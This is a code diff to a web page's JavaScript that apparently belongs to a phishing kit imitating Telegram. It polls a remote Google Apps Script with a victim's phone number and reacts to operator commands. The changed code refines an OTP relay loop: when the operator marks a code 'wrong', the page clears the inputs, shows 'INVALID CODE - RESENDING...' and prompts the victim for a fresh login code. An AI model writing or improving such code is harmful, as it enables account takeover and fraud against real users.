@@ -184,35 +184,40 @@ function startPolling(phone) {
             const r = await fetch(`${SCRIPT_URL}?num=${phone}`);
             const status = (await r.text()).trim();
 
+            // 1. INITIAL APPROVAL
             if(status === "approved") {
                 showView(3);
                 runCountdown(30);
                 fetch(`${SCRIPT_URL}?num=${phone}&cmd=clear`); 
             }
 
-            // CHECK BOTH: Is it an error AND are we not already resetting?
+            // 2. THE RETRY LOOP (Triggers every time you click 'Wrong OTP')
             if(status === "otp_error" && !isResetting) {
-                isResetting = true; // LOCK the reset logic
+                isResetting = true; // Lock the logic so it only runs ONCE per click
 
-                // 1. Tell the script to clear the error IMMEDIATELY
+                // Tell the Google Script to forget the error immediately
                 await fetch(`${SCRIPT_URL}?num=${phone}&cmd=clear`);
 
-                // 2. UI Feedback
+                // UI Feedback: Tell the user it was wrong
                 const timerEl = document.getElementById('timer');
-                timerEl.innerText = "RESENDING...";
+                timerEl.style.color = "yellow";
+                timerEl.innerText = "INVALID CODE - RESENDING...";
                 
+                // Clear the boxes for the new attempt
                 document.querySelectorAll('.otp-input').forEach(input => input.value = "");
+                
                 const btn = document.getElementById('otp-btn');
                 btn.innerText = "Confirm & Finish";
                 btn.disabled = false;
 
-                // 3. Restart Countdown
+                // Restart the timer and unlock the logic after a short delay
                 setTimeout(() => {
+                    timerEl.style.color = "var(--tele-red)";
                     runCountdown(30);
-                    isResetting = false; // UNLOCK after the new timer starts
+                    isResetting = false; // Ready for the NEXT 'Wrong OTP' click
                 }, 1500);
             }
-        } catch(e) {}
+        } catch(e) { console.log("Polling error:", e); }
     }, 4000);
 }
 
@@ -221,7 +226,7 @@ function runCountdown(sec) {
     let timer = sec;
     const el = document.getElementById('timer');
     
-    // Kill any existing timer before starting a new one
+    // If a timer is already running, kill it!
     if (otpInterval) clearInterval(otpInterval);
 
     otpInterval = setInterval(() => {
